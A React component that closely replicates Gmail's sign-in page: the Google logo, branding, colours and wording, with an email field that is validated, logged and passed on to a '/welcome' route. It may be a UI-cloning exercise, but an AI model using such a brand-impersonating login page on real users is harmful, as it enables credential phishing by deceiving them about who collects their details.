import { useState } from 'react'
import { Link, useNavigate } from 'react-router'
import mapTwo from '../assets/images/map-two.webp'
import Container from '../components/Container'

const GoogleG = () => (
  <svg width="48" height="48" viewBox="0 0 48 48" className="w-10 h-10 sm:w-12 sm:h-12">
    <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
    <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
    <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
    <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
  </svg>
)

const Sign = () => {
  const [email, setEmail] = useState('')
  const [error, setError] = useState('')
  const navigate = useNavigate()

  const handleNext = (e) => {
    e.preventDefault()
    
    const cleanEmail = email.trim()
    const emailOrPhoneRegex = /^([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}|[0-9+]{10,15})$/

    if (!cleanEmail) {
      setError('Enter an email or phone number')
      return
    }

    if (emailOrPhoneRegex.test(cleanEmail)) {
      console.log(cleanEmail)
      setError('')
      navigate('/welcome', { state: { email: cleanEmail } })
    } else {
      console.log(cleanEmail)
      setError('Enter a valid email address or phone number')
    }
  }

  return (
    <section
      className="min-h-screen w-full flex items-center justify-center bg-cover bg-center bg-no-repeat p-4 sm:p-6"
      style={{ backgroundImage: `url(${mapTwo})` }}
    >
      <Container>
        <div className="flex  justify-center items-center w-full">
          <div
            className="bg-white rounded-[28px] p-6 sm:px-6 md:py-6 sm:py-10 md:py-12 w-full max-w-[900px] grid grid-cols-1 md:grid-cols-2 gap-6 md:gap-12 items-center"
            style={{
              boxShadow: '0 1px 3px 0 rgba(60,64,67,0.15), 0 4px 8px 3px rgba(60,64,67,0.1)'
            }}
          >

            
            <div className="flex flex-col justify-start items-center text-center md:items-start md:text-left">
              <div>
                <GoogleG />
              </div>
              <h1 className="mt-3 text-3xl sm:text-[40px] font-normal leading-tight text-[#1f1f1f]">
                Sign in
              </h1>
              <p className="text-base font-normal leading-6 text-[#1f1f1f] mt-2 sm:mt-3">
                to continue to Gmail
              </p>
            </div>

            
            <div className="flex flex-col justify-center w-full">
              <form onSubmit={handleNext} noValidate className="w-full">
                <div className="relative w-full mb-2">
                  <input
                    type="text"
                    placeholder="Email or phone"
                    value={email}
                    onChange={(e) => {
                      setEmail(e.target.value)
                      if (error) setError('')
                    }}
                    className={`w-full h-[54px] px-4 text-base text-[#1f1f1f] placeholder:text-[#5f6368] border ${
                      error ? 'border-[#d93025]' : 'border-[#c4c7c5]'
                    } rounded-lg outline-none focus:border-[#0b57d0] focus:border-2 transition-all`}
                  />
                  {error && (
                    <p className="text-[#d93025] text-sm mt-1.5 pl-1 text-left">
                      {error}
                    </p>
                  )}
                </div>

                <div className="mb-6">
                  <Link className="text-sm sm:text-base font-medium text-[#0b57d0] hover:underline">
                    Forgot email?
                  </Link>
                </div>

                <div className="text-sm font-normal text-[#444746] mb-6 sm:mb-8 md:pr-13  sm:pr-4 ">
                  Not your computer? Use Guest mode to sign in privately.
                  <br className="hidden sm:inline" /> {' '}
                  <Link className="font-normal text-sm text-[#0b57d0] hover:underline inline-block mt-1 sm:mt-0">
                    Learn more about using Guest mode
                  </Link>
                </div>

                <div className="flex items-center justify-between pt-2">
                  <Link className="text-sm font-medium text-[#0b57d0] hover:underline">
                    Create account
                  </Link>
                  <button
                    type="submit"
                    className="h-10 px-6 text-sm font-medium text-white bg-[#0b57d0] rounded-full hover:bg-[#1b66c9] transition-all cursor-pointer"
                  >
                    Next
                  </button>
                </div>
              </form>
            </div>

          </div>
        </div>
      </Container>
    </section>
  )
}

export default Sign